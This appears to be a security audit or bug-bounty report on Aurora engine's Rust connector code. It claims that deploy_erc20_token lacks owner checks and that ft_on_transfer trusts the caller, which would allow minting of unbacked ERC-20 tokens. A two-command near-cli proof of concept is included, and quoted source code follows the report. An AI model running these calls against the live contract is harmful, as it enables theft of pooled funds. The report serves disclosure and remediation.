### Title
Missing Access Control in `deploy_erc20_token` Enables Unauthorized ERC-20 Token Minting via `ft_on_transfer` - (File: `engine/src/contract_methods/connector.rs`)

---

### Summary

The `deploy_erc20_token` function in `engine/src/contract_methods/connector.rs` lacks any caller access control. Any NEAR account can invoke it to register an arbitrary account ID as a NEP-141 token and deploy a corresponding ERC-20 mapping on Aurora. Because `ft_on_transfer` — the NEP-141 receive callback — trusts the predecessor account ID as the token identity without verifying it is a legitimate NEP-141 contract, an attacker who has registered their own account can subsequently call `ft_on_transfer` directly to mint unbacked ERC-20 tokens on Aurora.

---

### Finding Description

**Root cause 1 — `deploy_erc20_token` has no access control.**

`engine/src/contract_methods/connector.rs` lines 111–158:

```rust
pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I, env: &E, handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;   // ← only liveness check
        // ← NO require_owner_only or any caller restriction
        let bytes = io.read_input().to_vec();
        let args = DeployErc20TokenArgs::deserialize(&bytes)…;
        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;
                …
            }
            DeployErc20TokenArgs::WithMetadata(nep141) => {
                // comment: "this transaction could be executed by the owner of the contract only"
                // ← but no enforcement exists
                …
            }
        }
    })
}
```

The inline comment in the `WithMetadata` branch explicitly states the function should be owner-only, yet neither branch enforces this. The function is exposed as a public WASM export in `engine/src/lib.rs` at line 614 (`pub extern "C" fn deploy_erc20_token()`), reachable by any NEAR account. [1](#0-0) [2](#0-1) 

**Root cause 2 — `ft_on_transfer` does not verify the predecessor is a legitimate NEP-141 contract.**

`engine/src/contract_methods/connector.rs` lines 62–108:

```rust
pub fn ft_on_transfer<…>(io: I, env: &E, handler: &mut H) -> … {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let predecessor_account_id = env.predecessor_account_id();
        …
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            // Any account that has a registered ERC-20 mapping triggers minting
            engine.receive_erc20_tokens(
                &predecessor_account_id,   // ← treated as the NEP-141 token identity
                &args,
                &current_account_id,
                handler,
            )
        };
        …
    })
}
```

The only guard is whether the predecessor equals the connector account. For every other predecessor, `receive_erc20_tokens` is called, which looks up the ERC-20 address via `get_erc20_from_nep141(&self.io, token)` and mints tokens. There is no check that the predecessor is a real NEP-141 contract that actually transferred tokens. [3](#0-2) [4](#0-3) 

---

### Impact Explanation

**Critical — Direct theft of funds (unbacked token minting).**

An attacker can mint an arbitrary quantity of any ERC-20 token on Aurora that corresponds to a NEP-141 they have self-registered. These tokens can be sold on Aurora DEXes (e.g., Trisolaris) for legitimate assets, draining liquidity pools. The minted tokens have no NEP-141 backing, so the bridge accounting becomes insolvent for that token.

---

### Likelihood Explanation

**High.** The attack requires only two permissionless NEAR transactions:
1. `deploy_erc20_token` — callable by any NEAR account, no deposit or special privilege required.
2. `ft_on_transfer` — a standard public NEAR contract method, callable by any NEAR account.

No leaked keys, governance capture, or social engineering is needed. The attacker controls both the NEP-141 account ID and the minted amount entirely through calldata.

---

### Recommendation

1. **Add `require_owner_only` to `deploy_erc20_token`** (both `Legacy` and `WithMetadata` variants), consistent with the existing pattern used by all other state-mutating admin functions:

```diff
  require_running(&state::get_state(&io)?)?;
+ require_owner_only(&state::get_state(&io)?, &env.predecessor_account_id())?;
```

2. **Verify in `ft_on_transfer` that the predecessor has a registered ERC-20 mapping before minting**, or alternatively require that `ft_on_transfer` is only reachable as a genuine NEP-141 callback (i.e., the predecessor must be a known, whitelisted NEP-141 contract). [5](#0-4) 

---

### Proof of Concept

```
# Step 1 — Register attacker's own NEAR account as a NEP-141 token
near call aurora.near deploy_erc20_token \
  '{"nep141": "attacker.near"}' \
  --accountId attacker.near

# Step 2 — Directly call ft_on_transfer as attacker.near (no real token transfer)
near call aurora.near ft_on_transfer \
  '{"sender_id": "attacker.near", "amount": "1000000000000000000000000", "msg": "<attacker_evm_address_hex>"}' \
  --accountId attacker.near
```

After step 1, `get_erc20_from_nep141(io, "attacker.near")` returns the deployed ERC-20 address. After step 2, `receive_erc20_tokens` mints `1000000000000000000000000` units of that ERC-20 to the attacker's EVM address. The attacker then sells these unbacked tokens on any Aurora DEX, draining real liquidity. [6](#0-5) [7](#0-6)

pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })

#[named]
pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let bytes = io.read_input().to_vec();
        let args =
            DeployErc20TokenArgs::deserialize(&bytes).map_err(|_| errors::ERR_BORSH_DESERIALIZE)?;

        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;

                io.return_output(
                    &borsh::to_vec(address.as_bytes()).map_err(|_| errors::ERR_SERIALIZE)?,
                );
                Ok(PromiseOrValue::Value(address))
            }
            DeployErc20TokenArgs::WithMetadata(nep141) => {
                let args = borsh::to_vec(&nep141).map_err(|_| errors::ERR_SERIALIZE)?;
                let base = PromiseCreateArgs {
                    target_account_id: nep141,
                    method: "ft_metadata".to_string(),
                    args: vec![],
                    attached_balance: ZERO_YOCTO,
                    attached_gas: READ_PROMISE_ATTACHED_GAS,
                };
                let callback = PromiseCreateArgs {
                    target_account_id: env.current_account_id(),
                    method: "deploy_erc20_token_callback".to_string(),
                    args,
                    attached_balance: ZERO_YOCTO,
                    attached_gas: DEPLOY_ERC20_TOKEN_CALLBACK_ATTACHED_GAS,
                };
                // Safe because these promises are read-only calls to the main engine contract
                // and this transaction could be executed by the owner of the contract only.
                let promise_args = PromiseWithCallbackArgs { base, callback };
                let promise_id = handler.promise_create_with_callback(&promise_args);

                handler.promise_return(promise_id);

                Ok(PromiseOrValue::Promise(promise_args))
            }
        }
    })

    pub fn receive_erc20_tokens<P: PromiseHandler>(
        &mut self,
        token: &AccountId,
        args: &FtOnTransferArgs,
        current_account_id: &AccountId,
        handler: &mut P,
    ) -> Result<Option<SubmitResult>, ContractError> {
        let amount = args.amount.as_u128();
        // Parse message to determine recipient
        let mut recipient = {
            // The message should contain the recipient EOA address.
            let message = args.msg.strip_prefix("0x").unwrap_or(&args.msg);
            // Recipient - 40 characters (Address in hex without '0x' prefix)
            if message.len() < 40 {
                return Err(ParseOnTransferMessageError::WrongMessageFormat.into());
            }
            let mut address_bytes = [0; 20];
            hex::decode_to_slice(&message[..40], &mut address_bytes)
                .map_err(|_| ParseOnTransferMessageError::WrongMessageFormat)?;
            Address::from_array(address_bytes)
        };

        if let Some(fallback_address) = silo::get_erc20_fallback_address(&self.io)
            && !silo::is_allow_receive_erc20_tokens(&self.io, &recipient)
        {
            recipient = fallback_address;
        }

        let erc20_token = get_erc20_from_nep141(&self.io, token)?;
        let erc20_admin_address = current_address(current_account_id);
        let result = self
            .call(
                &erc20_admin_address,
                &erc20_token,
                Wei::zero(),
                setup_receive_erc20_tokens_input(&recipient, amount),
                u64::MAX,
                Vec::new(), // TODO: are there values we should put here?
                Vec::new(),
                handler,
            )
            .and_then(submit_result_or_err)?;

        sdk::log!("Mint {amount} ERC-20 tokens for: {}", recipient.encode());
